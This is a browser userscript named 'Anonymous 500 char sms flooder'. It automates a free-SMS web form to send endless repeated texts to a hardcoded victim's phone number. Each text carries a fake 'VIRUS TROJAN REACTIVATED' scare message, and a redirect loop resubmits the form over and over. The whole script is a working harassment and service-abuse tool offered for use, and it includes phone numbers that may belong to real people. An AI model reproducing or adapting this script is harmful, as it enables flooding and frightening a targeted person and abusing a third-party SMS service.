// ==UserScript==
// @name          Anonymous 500 char sms flooder
// @namespace     Yash
// @description   flooder sms
// @include       http://*bollywoodmotion.com/*
// ==/UserScript==

var victim=9687390316; //Enter victims number here
var msg="VIRUS TROJAN REACTIVATED-YOUR COMPUTER IS AT HIGH RISK"; // EnterUr message here
var urname="9485672353";  // Enter ur name

if(document.location=="http://www.bollywoodmotion.com/freesms/sms/sms.php"||document.location=="http://bollywoodmotion.com/freesms/sms/sms.php")
{
document.getElementsByName("name")[0].value=urname;
document.getElementsByName("mv")[0].value=victim;
document.getElementsByName("Message")[0].value=Math.floor(Math.random()*1456484)+"\n"+msg+Math.floor(Math.random()*1456484);
void(0);
document.forms[0].submit();
}


if(document.location=="http://www.bollywoodmotion.com/freesms/sms/sendsmsz.php")
document.location="http://www.bollywoodmotion.com/freesms/sms/sms.php"